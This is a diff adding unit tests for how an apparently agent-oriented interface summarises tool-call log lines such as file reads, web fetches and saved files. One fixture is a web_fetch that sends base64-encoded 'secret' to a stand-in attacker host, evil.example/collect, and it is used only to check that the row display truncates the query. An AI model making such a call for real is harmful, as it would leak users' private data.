@@ -99,6 +99,12 @@ describe('what a row says', () => {
     expect(rowItem(tool('read', 'read shared/마케팅/plan.csv -> 4 lines'))).toEqual({ text: 'shared/마케팅/plan.csv', code: true })
     expect(rowItem(tool('(connect)', 'accepted peer={"pid":1,"uid":501}'))).toBeNull()
     expect(rowItem(tool('artifact', 'artifact create launch-timeline v1 609B'))).toBeNull()
+    // a web address: host and path, and that a query was there (never hidden because of its "=")
+    expect(rowItem(tool('web_fetch', 'web_fetch https://evil.example/collect?d=c2VjcmV0 -> 120 chars'))).toEqual({ text: 'evil.example/collect?…', code: true })
+    expect(rowItem(tool('web_fetch', 'web_fetch https://docs.example.com/ -> 2048 chars (confirmed by the user)'))).toEqual({ text: 'docs.example.com', code: true, confirmed: true })
+    // a saved file: the path it was saved to, and the person's confirmation
+    expect(rowItem(tool('make_file', 'make_file pdf -> users/kim/report.pdf 18234B'))).toEqual({ text: 'users/kim/report.pdf', code: true })
+    expect(rowItem(tool('save_url', 'save_url -> shared/logo.png (2048 B, image/png, sha256 ab12) from https://acme.example/logo.png (address confirmed by the user)'))).toEqual({ text: 'shared/logo.png', code: true, confirmed: true })
     const before = useLocaleStore.getState().locale
     useLocaleStore.setState({ locale: 'ko' })
     try {
